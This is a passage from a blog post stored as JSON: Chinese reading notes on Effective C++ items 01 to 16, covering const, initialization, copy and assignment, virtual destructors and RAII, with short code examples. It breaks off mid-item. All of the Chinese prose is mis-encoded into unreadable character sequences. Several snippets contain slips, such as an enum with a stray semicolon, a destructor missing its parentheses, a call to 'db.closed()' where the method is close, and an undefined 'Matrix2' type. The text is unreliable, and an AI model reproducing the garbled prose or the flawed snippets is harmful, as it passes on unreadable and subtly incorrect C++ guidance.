Cpp","slug":"Effective-Cpp","date":"2022-03-15T13:43:52.000Z","updated":"2024-01-09T10:23:34.187Z","comments":true,"path":"posts/95b1972c.html","link":"","permalink":"https://racleray.github.io/posts/95b1972c.html","excerpt":"Effective Cpp è¯»ä¹¦ç¬”è®°","text":"ä¸€ã€ä¹ æƒ¯C++ æ¡æ¬¾01ï¼šè§†C++ä¸ºä¸€ä¸ªè¯­è¨€è”é‚¦ C++å·²ç»æ˜¯ä¸ªå¤šé‡èŒƒå‹ç¼–ç¨‹è¯­è¨€ï¼ˆmultiparadigm programminglanguageï¼‰ï¼Œä¸€ä¸ªåŒæ—¶æ”¯æŒè¿‡ç¨‹å½¢å¼ï¼ˆproceduralï¼‰ã€é¢å‘å¯¹è±¡å½¢å¼ï¼ˆobject-orientedï¼‰ã€å‡½æ•°å½¢å¼ï¼ˆfunctionalï¼‰ã€æ³›å‹å½¢å¼ï¼ˆgenericï¼‰ã€å…ƒç¼–ç¨‹å½¢å¼ï¼ˆmetaprogrammingï¼‰çš„è¯­è¨€ã€‚ C++çš„é‡è¦ç»„æˆï¼šCã€Object-Oriented C++ã€Template C++ã€STLã€‚ C++æ˜¯åŒ…å«å››ç§æ¬¡è¯­è¨€çš„ä¸€ä½“å¤šé¢è¯­è¨€ï¼Œå…³é”®çœ‹ä½ æ€ä¹ˆç”¨ã€‚ æ¯”å¦‚ï¼Œåªåœ¨Cè¯­è¨€éƒ¨åˆ†ï¼Œpass-by-valueé€šå¸¸æ¯”pass-by-referenceé«˜æ•ˆï¼Œä½†åœ¨é¢å‘å¯¹è±¡éƒ¨åˆ†ï¼Œæ­£å¥½ç›¸åï¼Œpass-by-reference-to-constæ˜¯ç›¸å¯¹æ›´å¥½çš„é€‰æ‹©ã€‚ è€Œåœ¨STLä¸­ï¼Œè¿­ä»£å™¨å’Œå‡½æ•°å¯¹è±¡æ˜¯åœ¨C pointerä¹‹ä¸Šï¼Œæ‰€ä»¥pass-by-valueæ›´é«˜æ•ˆã€‚ æ¡æ¬¾02ï¼šå°½é‡ä»¥constï¼Œenumï¼Œinlineæ›¿æ¢ï¼ƒdefine â€œå®å¯è®©ç¼–è¯‘å™¨æ›¿æ¢é¢„å¤„ç†å™¨â€ã€‚ å¯¹äºå•çº¯å¸¸é‡ï¼Œæœ€å¥½ä»¥constå¯¹è±¡æˆ–enumsæ›¿æ¢ #defineã€‚ å¯¹äºå½¢ä¼¼å‡½æ•°çš„å®ï¼ˆmacrosï¼‰ï¼Œæœ€å¥½æ”¹ç”¨inlineå‡½æ•°æ›¿æ¢ #defineï¼Œé¿å…å‡ºé”™ã€‚ #ifdef / #ifndef ç»§ç»­æ‰®æ¼”æ§åˆ¶ç¼–è¯‘çš„é‡è¦è§’è‰²ã€‚ 123const double Ratio = 1.5;#define RATIO 1.5 åœ¨ç¼–è¯‘å™¨é”™è¯¯å¤„ç†æ—¶ï¼Œ#defineä¸ä¼šå‘Šè¯‰ä½  RATIO çš„å‡ºç°ä¿¡æ¯ï¼Œè€Œæ˜¯è¢«æ›¿æ¢çš„1.5ã€‚ enum å¯ä»¥ä½œä¸ºä¸€ç§in classå¸¸é‡åˆå€¼è®¾å®šçš„æ–¹å¼ã€‚è¿™æ ·å°±å–ä¸åˆ°æˆå‘˜å˜é‡çš„åœ°å€ã€‚ 12345class Player&#123;private: enum &#123;NumTurns = 5;&#125;; ...&#125;; æ¡æ¬¾03ï¼šå°½å¯èƒ½ä½¿ç”¨const å¦‚æœå…³é”®å­— constå‡ºç°åœ¨æ˜Ÿå·å·¦è¾¹ï¼Œè¡¨ç¤ºè¢«æŒ‡ç‰©æ˜¯å¸¸é‡ï¼›å¦‚æœå‡ºç°åœ¨æ˜Ÿå·å³è¾¹ï¼Œè¡¨ç¤ºæŒ‡é’ˆè‡ªèº«æ˜¯å¸¸é‡ï¼›å¦‚æœå‡ºç°åœ¨æ˜Ÿå·ä¸¤è¾¹ï¼Œè¡¨ç¤ºè¢«æŒ‡ç‰©å’ŒæŒ‡é’ˆä¸¤è€…éƒ½æ˜¯å¸¸é‡ã€‚ å°†constå®æ–½äºæˆå‘˜å‡½æ•°çš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†ç¡®è®¤è¯¥æˆå‘˜å‡½æ•°å¯ä½œç”¨äºconstå¯¹è±¡èº«ä¸Šã€‚ è¿™ä¸€ç±»æˆå‘˜å‡½æ•°ä¹‹æ‰€ä»¥é‡è¦ï¼ŒåŸºäºä¸¤ä¸ªç†ç”±ã€‚ç¬¬ä¸€ï¼Œå®ƒä½¿ class æ¥å£æ¯”è¾ƒå®¹æ˜“è¢«ç†è§£ã€‚è¿™æ˜¯å› ä¸ºï¼Œå¾—çŸ¥å“ªä¸ªå‡½æ•°å¯ä»¥æ”¹åŠ¨å¯¹è±¡å†…å®¹è€Œå“ªä¸ªå‡½æ•°ä¸è¡Œï¼Œå¾ˆæ˜¯é‡è¦ã€‚ç¬¬äºŒï¼Œå®ƒä½¿â€œæ“ä½œconstå¯¹è±¡â€æˆä¸ºå¯èƒ½ã€‚ ä¸¤ä¸ªæˆå‘˜å‡½æ•°å¦‚æœåªæ˜¯å¸¸é‡æ€§ï¼ˆconstnessï¼‰ä¸åŒï¼Œä¹Ÿå¯ä»¥è¢«é‡è½½ã€‚æ¯”å¦‚ const T&amp; getXXX() const;å’ŒT&amp; getXXX(); åœ¨constæˆå‘˜å‡½æ•°éœ€è¦è¢«ä¿®æ”¹çš„å˜é‡ï¼Œä½¿ç”¨mutableä¿®é¥°ã€‚mutableé‡Šæ”¾æ‰non-staticæˆå‘˜å˜é‡çš„bitwise constnessçº¦æŸã€‚ 1234567891011121314151617class CBook&#123; ...public: std::size_t len() const;private: mutable std::size_t length; mutable bool isValid;&#125;;std::size_t len() const&#123; if (!isValid)&#123; length = std::strlen(text); isValid = true; &#125; return length;&#125;; åˆ©ç”¨const_castå°†å¸¸é‡æ€§ç§»é™¤ï¼Œå¯ä»¥è¿ç”¨constæˆå‘˜å‡½æ•°å®ç°å‡ºå…¶non-constå­ªç”Ÿå…„å¼Ÿã€‚å½“ constå’Œnon-constæˆå‘˜å‡½æ•°æœ‰ç€å®è´¨ç­‰ä»·çš„å®ç°æ—¶ï¼Œä»¤non-constç‰ˆæœ¬è°ƒç”¨constç‰ˆæœ¬å¯é¿å…ä»£ç é‡å¤ã€‚ 123456789101112class CBook&#123;public: const char&amp; operator[] (std::size_t pos) const&#123; ... return text[pos]; &#125; char&amp; operator[] (std::size_t pos) &#123; return const_cast&lt;char&amp;&gt;( static_cast&lt;const CBook*&gt;(*this)[pos]); &#125;&#125;; å¦å¤–ï¼Œå°†æŸäº›ä¸œè¥¿å£°æ˜ä¸º const å¯å¸®åŠ©ç¼–è¯‘å™¨ä¾¦æµ‹å‡ºé”™è¯¯ç”¨æ³•ã€‚constå¯è¢«æ–½åŠ äºä»»ä½•ä½œç”¨åŸŸå†…çš„å¯¹è±¡ã€å‡½æ•°å‚æ•°ã€å‡½æ•°è¿”å›ç±»å‹ã€æˆå‘˜å‡½æ•°æœ¬ä½“ã€‚ æ¡æ¬¾04ï¼šç¡®å®šå¯¹è±¡è¢«ä½¿ç”¨å‰å·²å…ˆè¢«åˆå§‹åŒ– æ°¸è¿œåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰å…ˆå°†å®ƒåˆå§‹åŒ–ã€‚ç¡®ä¿æ¯ä¸€ä¸ªæ„é€ å‡½æ•°éƒ½å°†å¯¹è±¡çš„æ¯ä¸€ä¸ªæˆå‘˜åˆå§‹åŒ–ã€‚åº”è¯¥å°½é‡ä½¿ç”¨initialization listã€‚ C++æœ‰ç€ååˆ†å›ºå®šçš„â€œæˆå‘˜åˆå§‹åŒ–æ¬¡åºâ€ã€‚base classesæ›´æ—©äºå…¶derived classesè¢«åˆå§‹åŒ–ï¼ˆè§æ¡æ¬¾12ï¼‰ï¼Œè€Œclassçš„æˆå‘˜å˜é‡æ€»æ˜¯ä»¥å…¶å£°æ˜æ¬¡åºè¢«åˆå§‹åŒ–ã€‚ ä¸ºå†…ç½®å‹å¯¹è±¡è¿›è¡Œæ‰‹å·¥åˆå§‹åŒ–ï¼Œå› ä¸ºC++ä¸ä¿è¯åˆå§‹åŒ–å®ƒä»¬ã€‚ æ„é€ å‡½æ•°æœ€å¥½ä½¿ç”¨æˆå‘˜åˆå€¼åˆ—ï¼ˆmember initialization listï¼‰ï¼Œè€Œä¸è¦åœ¨æ„é€ å‡½æ•°æœ¬ä½“å†…ä½¿ç”¨èµ‹å€¼æ“ä½œï¼ˆassignmentï¼‰ã€‚initialization liståˆ—å‡ºçš„æˆå‘˜å˜é‡ï¼Œå…¶æ’åˆ—æ¬¡åºåº”è¯¥å’Œå®ƒä»¬åœ¨classä¸­çš„å£°æ˜æ¬¡åºç›¸åŒã€‚ ä¸ºå…é™¤â€œè·¨ç¼–è¯‘å•å…ƒä¹‹åˆå§‹åŒ–æ¬¡åºâ€é—®é¢˜ï¼Œè¯·ä»¥local staticå¯¹è±¡æ›¿æ¢non-localstaticå¯¹è±¡ï¼Œç¡®ä¿åœ¨ä½¿ç”¨å¯¹è±¡å‰ï¼Œåˆå§‹åŒ–å¯¹è±¡ã€‚Singletonæ¨¡å¼çš„ä¸€ä¸ªå¸¸è§å®ç°æ‰‹æ³•ã€‚ 12345678910111213141516171819class FileSys&#123;...&#125;;FileSys&amp; tfs()&#123; static FileSys fs; return fs;&#125;class Dir&#123;...&#125;;Dir::Dir(params)&#123; ... std::size_t disks = tfs().numDisks(); ...&#125;Dir&amp; tmpDir()&#123; static Dir td; return td;&#125; äºŒã€æ„é€ /ææ„/èµ‹å€¼è¿ç®— æ¡æ¬¾05ï¼šäº†è§£C++é»˜é»˜ç¼–å†™å¹¶è°ƒç”¨å“ªäº›å‡½æ•° ç¼–è¯‘å™¨å°±ä¼šä¸ºå®ƒå£°æ˜ï¼ˆç¼–è¯‘å™¨ç‰ˆæœ¬çš„ï¼‰ä¸€ä¸ªcopyæ„é€ å‡½æ•°ã€ä¸€ä¸ªcopy assignmentæ“ä½œç¬¦å’Œä¸€ä¸ªææ„å‡½æ•°ã€‚æ­¤å¤–å¦‚æœä½ æ²¡æœ‰å£°æ˜ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¹Ÿä¼šä¸ºä½ å£°æ˜ä¸€ä¸ªdefaultæ„é€ å‡½æ•°ã€‚æ‰€æœ‰è¿™äº›å‡½æ•°éƒ½æ˜¯publicä¸”inline ï¼ˆè§æ¡æ¬¾30ï¼‰ã€‚ copyæ„é€ å‡½æ•°è¢«ç”¨æ¥â€œä»¥åŒå‹å¯¹è±¡åˆå§‹åŒ–è‡ªæˆ‘å¯¹è±¡â€ï¼Œcopy assignmentæ“ä½œç¬¦è¢«ç”¨æ¥â€œä»å¦ä¸€ä¸ªåŒå‹å¯¹è±¡ä¸­æ‹·è´å…¶å€¼åˆ°è‡ªæˆ‘å¯¹è±¡â€ã€‚copyæ„é€ å‡½æ•°æ˜¯ä¸€ä¸ªå°¤å…¶é‡è¦çš„å‡½æ•°ï¼Œå› ä¸ºå®ƒå®šä¹‰ä¸€ä¸ªå¯¹è±¡å¦‚ä½•passed by value ã€‚ ç¼–è¯‘å™¨å¯è‡ªåŠ¨ä¸ºclassåˆ›å»ºdefaultæ„é€ å‡½æ•°ã€copyæ„é€ å‡½æ•°ã€copyassignment æ“ä½œç¬¦ï¼Œä»¥åŠææ„å‡½æ•°ã€‚ 12345678class Empty&#123;public: Empty() &#123;...&#125;; Empty(const Empty&amp; rhs) &#123;...&#125;; ~Empty() &#123;...&#125;; Empty&amp; operator=(const Empty&amp; rhs) &#123;...&#125;;&#125; æ¡æ¬¾06ï¼šä¸ç”¨é»˜è®¤æ„é€ å‡½æ•°æ—¶ï¼Œéœ€è¦æ˜ç¡®å³æ‹’ç» æ˜ç¡®å£°æ˜ä¸€ä¸ªæˆå‘˜å‡½æ•°ï¼Œå¯ä»¥æ›¿ä»£ç¼–è¯‘å™¨é»˜è®¤ç‰ˆæœ¬ã€‚ æˆ–è€…æ‹’ç»ç¼–è¯‘å™¨é»˜è®¤ç‰ˆæœ¬ï¼Œå¯å°†ç›¸åº”çš„æˆå‘˜å‡½æ•°å£°æ˜ä¸ºprivateå¹¶ä¸”ä¸äºˆå®ç°ã€‚ æˆ–è€…ä½¿ç”¨deleteå…³é”®å­—ï¼Œæ˜ç¡®ä¸ä½¿ç”¨ã€‚ æ¡æ¬¾07ï¼šä¸ºå¤šæ€åŸºç±»å£°æ˜virtualææ„å‡½æ•° å½“derived classç»ç”±ä¸€ä¸ªbase classæŒ‡é’ˆè¢«åˆ é™¤æ—¶ï¼Œbase classè‹¥æ˜¯non-virtualææ„å‡½æ•°ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œderived classçš„ææ„å‡½æ•°ï¼Œå¯¼è‡´å†…å­˜æ³„éœ²ã€‚ æ¶ˆé™¤è¿™ä¸ªé—®é¢˜çš„åšæ³•å¾ˆç®€å•ï¼šç»™base classä¸€ä¸ªvirtualææ„å‡½æ•°ã€‚æ­¤ååˆ é™¤derived class å¯¹è±¡å°±ä¼šå¦‚ä½ æƒ³è¦çš„é‚£èˆ¬ã€‚ å¯¹è±¡éœ€è¦åœ¨è¿è¡ŒæœŸå†³å®šå“ªä¸€ä¸ªvirtualå‡½æ•°è¯¥è¢«è°ƒç”¨ã€‚ç”±ä¸€ä¸ªæ‰€è°“vptrï¼ˆvirtual table pointerï¼‰æŒ‡é’ˆæŒ‡å‡ºã€‚vptræŒ‡å‘ä¸€ä¸ªç”±å‡½æ•°æŒ‡é’ˆæ„æˆçš„æ•°ç»„ï¼Œç§°ä¸ºvtblï¼ˆvirtual tableï¼‰ï¼›æ¯ä¸€ä¸ªå¸¦æœ‰virtualå‡½æ•°çš„classéƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„vtblã€‚å½“å¯¹è±¡è°ƒç”¨æŸä¸€virtualå‡½æ•°ï¼Œå®é™…è¢«è°ƒç”¨çš„å‡½æ•°å–å†³äºè¯¥å¯¹è±¡çš„vptræ‰€æŒ‡çš„é‚£ä¸ªvtblâ€”â€”ç¼–è¯‘å™¨åœ¨å…¶ä¸­å¯»æ‰¾é€‚å½“çš„å‡½æ•°æŒ‡é’ˆã€‚ ææ„å‡½æ•°çš„è¿ä½œæ–¹å¼æ˜¯ï¼Œæœ€æ·±å±‚æ´¾ç”Ÿï¼ˆmost derivedï¼‰çš„é‚£ä¸ªclasså…¶ææ„å‡½æ•°æœ€å…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ˜¯å…¶æ¯ä¸€ä¸ªderived classçš„ææ„å‡½æ•°è¢«è°ƒç”¨ã€‚ å¦‚æœclasså¸¦æœ‰ä»»ä½•virtualå‡½æ•°ï¼Œå®ƒå°±åº”è¯¥æ‹¥æœ‰ä¸€ä¸ªvirtualææ„å‡½æ•°ã€‚ Class çš„è®¾è®¡ç›®çš„å¦‚æœä¸æ˜¯ä½œä¸º base classes ä½¿ç”¨ï¼Œæˆ–ä¸æ˜¯ä¸ºäº†å…·å¤‡å¤šæ€æ€§ï¼ˆpolymorphicalï¼‰ï¼Œå°±ä¸è¯¥å£°æ˜virtualææ„å‡½æ•°ã€‚ æ¡æ¬¾08ï¼šåˆ«è®©å¼‚å¸¸é€ƒç¦»ææ„å‡½æ•° ææ„å‡½æ•°ç»å¯¹ä¸è¦åå‡ºå¼‚å¸¸ã€‚å¦‚æœä¸€ä¸ªè¢«ææ„å‡½æ•°è°ƒç”¨çš„å‡½æ•°å¯èƒ½æŠ›å‡ºå¼‚å¸¸ï¼Œææ„å‡½æ•°åº”è¯¥æ•æ‰ä»»ä½•å¼‚å¸¸ï¼Œç„¶åä¸ä¼ é€’æˆ–ç»“æŸç¨‹åºã€‚å¦åˆ™å¯èƒ½å‡ºç°ä¸å¯é¢„çŸ¥çš„é£é™©ã€‚ å¦‚æœå®¢æˆ·éœ€è¦å¯¹æŸä¸ªæ“ä½œå‡½æ•°è¿è¡ŒæœŸé—´æŠ›å‡ºçš„å¼‚å¸¸åšå‡ºååº”ï¼Œé‚£ä¹ˆ class åº”è¯¥æä¾›ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼ˆè€Œéåœ¨ææ„å‡½æ•°ä¸­ï¼‰æ‰§è¡Œè¯¥æ“ä½œã€‚ 123456789101112131415161718192021class DBConn&#123;public: ... void close()&#123; db.close(); // å¯èƒ½å‡ºé”™ closed=true; &#125; ~DBConn&#123; if (!closed)&#123; try&#123; db.closed(); &#125;catch (...)&#123; ... &#125; &#125; &#125;private: DBConnection db; bool closed = false;&#125; æ¡æ¬¾09ï¼šç»ä¸åœ¨æ„é€ å’Œææ„è¿‡ç¨‹ä¸­è°ƒç”¨virtualå‡½æ•° derived classå¯¹è±¡å†…çš„base classä¼šåœ¨derived classè‡ªèº«è¢«æ„é€ ä¹‹å‰å…ˆæ„é€ ã€‚æ‰€ä»¥è°ƒç”¨virtual å‡½æ•°ï¼Œderived classå¹¶ä¸ºè¢«å®Œå…¨åˆå§‹åŒ–ï¼Œå¯¼è‡´å‡ºç°å‚æ•°æœªåˆå§‹åŒ–é”™è¯¯ã€‚ åœ¨derived classå¯¹è±¡çš„base classæ„é€ æœŸé—´ï¼Œå¯¹è±¡çš„ç±»å‹æ˜¯ base class è€Œä¸æ˜¯ derived classã€‚ä¸åª virtual å‡½æ•°ä¼šè¢«ç¼–è¯‘å™¨è§£æè‡³ï¼ˆresolve toï¼‰base classï¼Œè‹¥ä½¿ç”¨è¿è¡ŒæœŸç±»å‹ä¿¡æ¯ï¼ˆruntime typeinformationï¼Œä¾‹å¦‚dynamic_castï¼ˆè§æ¡æ¬¾27ï¼‰å’Œtypeidï¼‰ï¼Œä¹Ÿä¼šæŠŠå¯¹è±¡è§†ä¸ºbase classç±»å‹ã€‚ å”¯ä¸€èƒ½å¤Ÿé¿å…æ­¤é—®é¢˜çš„åšæ³•å°±æ˜¯ï¼šç¡®å®šä½ çš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°éƒ½æ²¡æœ‰ï¼ˆåœ¨å¯¹è±¡è¢«åˆ›å»ºå’Œè¢«é”€æ¯æœŸé—´ï¼‰è°ƒç”¨ virtual å‡½æ•°ã€‚ åœ¨æ„é€ å‡½æ•°æˆ–è€…ææ„å‡½æ•°ä¸­è°ƒç”¨virtual å‡½æ•°ï¼Œä¸ä¼šè°ƒç”¨åˆ° derived class å±‚çº§çš„å‡½æ•°ï¼ˆåªæ˜¯ base class é‚£å±‚ï¼‰ã€‚ **æ¡æ¬¾10ï¼šä»¤operator=è¿”å›ä¸€ä¸ª reference to *this** ä¸ºäº†å®ç°â€œè¿é”èµ‹å€¼â€ï¼Œèµ‹å€¼æ“ä½œç¬¦å¿…é¡»è¿”å›ä¸€ä¸ªreferenceæŒ‡å‘æ“ä½œç¬¦çš„å·¦ä¾§å®å‚ã€‚ä»¤èµ‹å€¼ï¼ˆassignmentï¼‰æ“ä½œç¬¦è¿”å›ä¸€ä¸ªreference to *thisã€‚ 12345678910111213141516171819202122232425class CC&#123;public: CC&amp; operator=(const CC&amp; rhs)&#123; ... return *this; &#125; CC&amp; operator+=(const CC&amp; rhs)&#123; ... return *this; &#125; CC&amp; operator=(int rhs)&#123; ... return *this; &#125; CC&amp; operator++() &#123; ... return *this; &#125; // åç½®++ï¼Œå¸¦å‚ï¼Œä¸”è¿”å›å€¼ const CC operator++(int) &#123; CC tmp = *this; this-&gt;operator++(); return tmp; &#125;&#125; æ¡æ¬¾11ï¼šåœ¨operator=ä¸­å¤„ç†â€œè‡ªæˆ‘èµ‹å€¼â€ æ¬²é˜»æ­¢è¿™ç§é”™è¯¯ï¼Œä¼ ç»Ÿåšæ³•æ˜¯è—‰ç”±operator=æœ€å‰é¢çš„ä¸€ä¸ªâ€œè¯åŒæµ‹è¯•ï¼ˆidentity testï¼‰â€è¾¾åˆ°â€œè‡ªæˆ‘èµ‹å€¼â€çš„æ£€éªŒç›®çš„ã€‚ åœ¨operator=å‡½æ•°å†…ç¡®ä¿ä»£ç ä¸ä½†â€œå¼‚å¸¸å®‰å…¨â€è€Œä¸”â€œè‡ªæˆ‘èµ‹å€¼å®‰å…¨â€çš„ä¸€ä¸ªæ›¿ä»£æ–¹æ¡ˆæ˜¯ï¼Œä½¿ç”¨æ‰€è°“çš„copy and swapæŠ€æœ¯ã€‚ä¸ä»…è§£å†³äº†ä»£ç å¤ç”¨ï¼Œè¿˜ä¿è¯äº†èµ‹å€¼æ“ä½œçš„å®‰å…¨æ€§ã€‚ 123456789101112131415161718192021222324252627template &lt;typename T&gt;class Matrix &#123; ... friend void swap(Matrix &amp;a, Matrix &amp;b) noexcept &#123; using std::swap; // è¿™ä¸€æ­¥å…è®¸ç¼–è¯‘å™¨åŸºäºADLå¯»æ‰¾åˆé€‚çš„swapå‡½æ•° swap(a.x, b.x); swap(a.y, b.y); swap(a.data, b.data); &#125; ...&#125;;Matrix&lt;T&gt;&amp; Matrix&lt;T&gt;::operator=(const Matrix &amp;rhs)&#123; // æ£€æµ‹è‡ªèµ‹å€¼ if (&amp;rhs == this) &#123; return *this; &#125; Matrix tmp = rhs; // copy swap(tmp, *this); // swap return *this;&#125;// ç”šè‡³äº move and swapMatrix&lt;T&gt;&amp; Matrix&lt;T&gt;::operator=(Matrix2 &amp;&amp;rhs) noexcept &#123; Matrix2 tmp&#123;std::forward&lt;Matrix2&gt;(rhs)&#125;; swap(*this, tmp); return *this;&#125; æ¡æ¬¾12ï¼šå¤åˆ¶å¯¹è±¡æ—¶å‹¿å¿˜å…¶æ¯ä¸€ä¸ªæˆåˆ† å¦‚æœä½ ä¸ºclassæ·»åŠ ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œä½ å¿…é¡»åŒæ—¶ä¿®æ”¹copyå‡½æ•°ã€‚ä½ ä¹Ÿéœ€è¦ä¿®æ”¹classçš„æ‰€æœ‰æ„é€ å‡½æ•°ï¼ˆè§æ¡æ¬¾4å’Œæ¡æ¬¾45ï¼‰ä»¥åŠä»»ä½•éæ ‡å‡†å½¢å¼çš„operator=ã€‚ derived classå¿…é¡»å¤åˆ¶å…¶base classæˆåˆ†ã€‚é‚£äº›æˆåˆ†å¾€å¾€æ˜¯privateï¼ˆè§æ¡æ¬¾22ï¼‰ï¼Œæ‰€ä»¥ä½ æ— æ³•ç›´æ¥è®¿é—®å®ƒä»¬ï¼Œåº”è¯¥è®©derived classçš„copyå‡½æ•°è°ƒç”¨ç›¸åº”çš„base classå‡½æ•°ã€‚ å½“ä½ ç¼–å†™ä¸€ä¸ªcopyå‡½æ•°ï¼Œè¯·ç¡®ä¿å¤åˆ¶æ‰€æœ‰ local æˆå‘˜å˜é‡ï¼Œè°ƒç”¨æ‰€æœ‰ base classes å†…çš„é€‚å½“çš„copyå‡½æ•°ã€‚ æ³¨æ„ï¼Œcopyæ„é€ å‡½æ•°å’Œcopy assignmentæ“ä½œç¬¦ï¼Œå¯ä»¥æå–å…¬å…±æ“ä½œï¼Œä½†æ˜¯ä¸èƒ½äº’ç›¸åµŒå¥—ä½¿ç”¨ã€‚ 1234567891011121314151617181920212223242526272829class Base&#123;private: string name;&#125;class Derived: public Base&#123;public: ... Derived(const Derived&amp; rhs); Derived&amp; operator=(const Derived&amp; rhs); ...private: int priority;&#125;Derived::Derived(const Derived&amp; rhs) :Base(rhs), priority(rhs.priority)&#123; ... &#125;// copyDerived&amp;Derived::operator=(const Derived&amp; rhs)&#123; ... Base::operator=(rhs); priority = rhs.priority; return *this;&#125; ä¸‰ã€èµ„æºç®¡ç† C++ç¨‹åºä¸­æœ€å¸¸ä½¿ç”¨çš„èµ„æºå°±æ˜¯åŠ¨æ€åˆ†é…å†…å­˜ï¼Œä½†å†…å­˜åªæ˜¯ä½ å¿…é¡»ç®¡ç†çš„ä¼—å¤šèµ„æºä¹‹ä¸€ã€‚å…¶ä»–å¸¸è§çš„èµ„æºè¿˜åŒ…æ‹¬æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorsï¼‰ã€äº’æ–¥é”ï¼ˆmutex locksï¼‰ã€å›¾å½¢ç•Œé¢ä¸­çš„å­—å‹å’Œç¬”åˆ·ã€æ•°æ®åº“è¿æ¥ã€ä»¥åŠç½‘ç»œsocketsã€‚ æ¡æ¬¾13ï¼šä»¥å¯¹è±¡ç®¡ç†èµ„æº æŠŠèµ„æºæ”¾è¿›å¯¹è±¡å†…ï¼Œ C++çš„â€œææ„å‡½æ•°è‡ªåŠ¨è°ƒç”¨æœºåˆ¶â€ç¡®ä¿èµ„æºè¢«é‡Šæ”¾ã€‚ è·å¾—èµ„æºåç«‹åˆ»æ”¾è¿›ç®¡ç†å¯¹è±¡ï¼ˆmanaging objectï¼‰å†…ã€‚â€œä»¥å¯¹è±¡ç®¡ç†èµ„æºâ€å¸¸è¢«ç§°ä¸ºâ€œèµ„æºå–å¾—æ—¶æœºä¾¿æ˜¯åˆå§‹åŒ–æ—¶æœºâ€ï¼ˆResource Acquisition Is Initializationï¼›RAIIï¼‰ï¼Œå‡ ä¹æ€»æ˜¯åœ¨è·å¾—èµ„æºåäºåŒä¸€è¯­å¥å†…ç”¨å®ƒåˆå§‹åŒ–æŸä¸ªç®¡ç†å¯¹è±¡ã€‚ ç®¡ç†å¯¹è±¡ï¼ˆmanaging objectï¼‰è¿ç”¨ææ„å‡½æ•°ç¡®ä¿èµ„æºè¢«é‡Šæ”¾ã€‚ä¸è®ºæ§åˆ¶æµå¦‚ä½•ç¦»å¼€åŒºå—ï¼Œä¸€æ—¦å¯¹è±¡è¢«é”€æ¯ï¼Œå…¶ææ„å‡½æ•°ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ ä¸ºé˜²æ­¢èµ„æºæ³„æ¼ï¼Œè¯·ä½¿ç”¨RAIIå¯¹è±¡ï¼Œå®ƒä»¬åœ¨æ„é€ å‡½æ•°ä¸­è·å¾—èµ„æºå¹¶åœ¨ææ„å‡½æ•°ä¸­é‡Šæ”¾èµ„æº ä¸¤ä¸ªå¸¸è¢«ä½¿ç”¨çš„RAII classesåˆ†åˆ«æ˜¯ std::shared_ptr å’Œ std::auto_ptrã€‚å‰è€…é€šå¸¸æ˜¯è¾ƒä½³é€‰æ‹©ï¼Œå› ä¸ºå…¶copyè¡Œä¸ºæ¯”è¾ƒç›´è§‚ã€‚è‹¥é€‰æ‹©auto_ptrï¼Œå¤åˆ¶åŠ¨ä½œä¼šä½¿ è¢«å¤åˆ¶çš„ptr æŒ‡å‘nullã€‚ ç”±äº std::shared_ptr å’Œ std::auto_ptr å†…éƒ¨ææ„ä½¿ç”¨çš„æ˜¯ delete è€Œä¸æ˜¯ delete[]ï¼Œæ‰€ä»¥ä»¥ä¸‹ä»£ç æ˜¯ä¸ªé”™è¯¯ï¼š 123std::auto_ptr&lt;std::string&gt; aps(new std::string[10]);std::shared_ptr&lt;std::string&gt; aps2(new std::string[10]); åˆ«å¯¹åŠ¨æ€åˆ†é…è€Œå¾—åˆ°çš„arrayä½¿ç”¨ std::shared_ptr å’Œ std::auto_ptrã€‚ æ¡æ¬¾14ï¼šå¤åˆ¶RAIIå¯¹è±¡éœ€è¦æ³¨æ„ å¤åˆ¶ RAII å¯¹è±¡å¿…é¡»ä¸€å¹¶å¤åˆ¶å®ƒæ‰€ç®¡ç†çš„èµ„æºï¼Œæ‰€ä»¥èµ„æºçš„ copying è¡Œä¸ºå†³å®šRAIIå¯¹è±¡çš„ copying è¡Œä¸ºã€‚ å¤„ç†æ–¹æ³•æ ¹æ®å¯¹è±¡åŠå…¶èµ„æºçš„ç‰¹ç‚¹å†³å®šã€‚ ç¦æ­¢å¤åˆ¶ 123class Lock: private Uncopyable &#123; ...&#125; å¯¹èµ„æºè¿›è¡Œå¼•ç”¨è®¡æ•°ã€‚ä½¿ç”¨ std::shared_ptrï¼ˆåŒæ—¶å¯ä»¥ç”¨ deleter å‚æ•°ä¼ å…¥ function objectï¼Œæ§åˆ¶è®¡æ•°ä¸º0æ—¶çš„è¡Œä¸ºï¼‰ã€‚ 123456789class Lock&#123;public: explicit Lock(Mutex* pm): mutexPtr(pm, unlock)&#123; // unlock ä¸º deleter lock(mutexPtr.get()); &#125;private: std::shared_ptr&lt;Mutex&gt; mutexPtr;&#125; æ·±æ‹·è´èµ„æº è½¬ç§»èµ„æºæ‹¥æœ‰æƒï¼Œæ¯”å¦‚ä½¿ç”¨ std::auto_ptr æ¡æ¬¾15ï¼šåœ¨èµ„æºç®¡ç†ç±»ä¸­æä¾›å¯¹åŸå§‹èµ„æºçš„è®¿é—® APIså¾€å¾€è¦æ±‚è®¿é—®åŸå§‹èµ„æºï¼ˆraw resourcesï¼‰ï¼Œæ‰€ä»¥æ¯ä¸€ä¸ªRAII classåº”è¯¥æä¾›ä¸€ä¸ªâ€œè®¿é—®åŸå§‹èµ„æºâ€çš„åŠæ³•ã€‚ å¯¹åŸå§‹èµ„æºçš„è®¿é—®å¯èƒ½ç»ç”±æ˜¾å¼è½¬æ¢æˆ–éšå¼è½¬æ¢ã€‚ä¸€èˆ¬è€Œè¨€æ˜¾å¼è½¬æ¢æ¯”è¾ƒå®‰å…¨ï¼Œéšå¼è½¬æ¢æ›´çµæ´»ã€‚ æ¡æ¬¾16ï¼šæˆå¯¹ä½¿ç”¨newå’Œdeleteæ—¶è¦é‡‡å–ç›¸åŒå½¢å¼ å½“ä½ ä½¿ç”¨ newï¼Œæœ‰ä¸¤ä»¶äº‹å‘ç”Ÿã€‚ç¬¬ä¸€ï¼Œå†…å­˜è¢«åˆ†é…å‡ºæ¥ï¼ˆé€šè¿‡åä¸ºoperator 